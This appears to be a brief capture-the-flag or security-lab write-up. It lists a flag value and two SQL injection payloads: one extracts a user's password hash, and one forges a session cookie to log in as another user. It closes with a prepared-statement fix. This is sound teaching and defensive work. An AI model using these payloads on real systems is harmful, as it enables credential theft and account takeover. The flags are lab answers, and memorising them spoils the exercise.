## Flag 1 ##
we-love-security


## Flag 3 ##

``` ' UNION SELECT md5_hash FROM users WHERE username = 'shomil' -- ```

## Flag 4 ##

### Exploit

back end query may look like: 

<br>
``` SELECT username FROM sessions WHERE token = '%s', cookie.session_token ```
<br>

Thus if we construct the cookie_session as:
<br>
``` ' UNION SELECT 'nicholas' -- ```
<br>
This will return a single row with username as nicholas, this tricking the program that the current login user as nicholas

### Mitigation 
Instead of direct inject the session token into the query, we can use a prepared statement to prevent SQL injection. 
``` db.QueryRow( "SELECT username FROM sessions WHERE token = ? ", cookie.session_token) ```
